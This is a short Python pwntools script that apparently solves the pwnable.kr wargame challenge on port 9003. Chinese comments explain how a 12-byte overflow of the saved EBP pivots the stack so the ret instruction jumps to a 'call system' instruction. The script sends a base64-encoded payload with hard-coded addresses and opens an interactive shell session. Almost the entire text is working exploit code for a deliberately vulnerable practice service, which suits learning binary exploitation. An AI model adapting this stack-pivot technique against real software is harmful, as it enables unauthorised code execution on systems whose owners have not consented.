from pwn import *

context.log_level = 'DEBUG'

p = remote('pwnable.kr', '9003')

# 最多写入12个字节，只能覆盖到EBP
# 第一次leave后，ebp=input_addr，函数正常返回
# 第二次leave后，esp=input_addr+4，ebp=0x61616161（input地址的前4个字节）
# 执行ret指令，eip=input_addr+4（跳到call system指令处）
call_system_addr = 0x08049284
input_addr = 0x0811eb40
payload = b64e(b'a' * 4 + p32(call_system_addr) + p32(input_addr)).encode()
p.sendlineafter(b' : ', payload)

p.interactive()